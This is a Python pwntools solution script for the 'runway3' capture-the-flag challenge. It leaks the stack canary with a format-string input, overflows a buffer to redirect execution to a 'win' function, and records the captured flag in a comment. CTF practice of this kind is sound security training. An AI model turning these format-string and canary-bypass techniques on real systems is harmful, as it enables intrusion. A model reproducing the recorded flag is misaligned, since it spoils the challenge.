from pwn import * 

exe = './runway3'
elf = context.binary = ELF(exe, checksec=True)
rop = ROP(exe)

host = 'challs.pwnoh.io' 
port = 13403
r = remote(host, port, level='DEBUG')
# r = process(exe, level='DEBUG')

gs = ''' 
break *echo
continue
''' 

## r = gdb.debug(exe, gdbscript=gs)

r.recvuntil(b'here?\n')

stack_payload = b'%13$lx'
r.sendline(stack_payload)
canary = int(r.recvline().strip().decode(), 16)

# printhex(ret_address))
payload = b'A' * 40 + p64(canary) + b'A' * 8 + p64(rop.ret[0]) + p64(elf.symbols['win'])

## print(payload)
## print(len(payload))

r.sendline(payload)

r.interactive()

## bctf{wh0_kn3w_pr1nt1ng_w4s_s0_d4nG3R0Us_11aabc3287e74603}
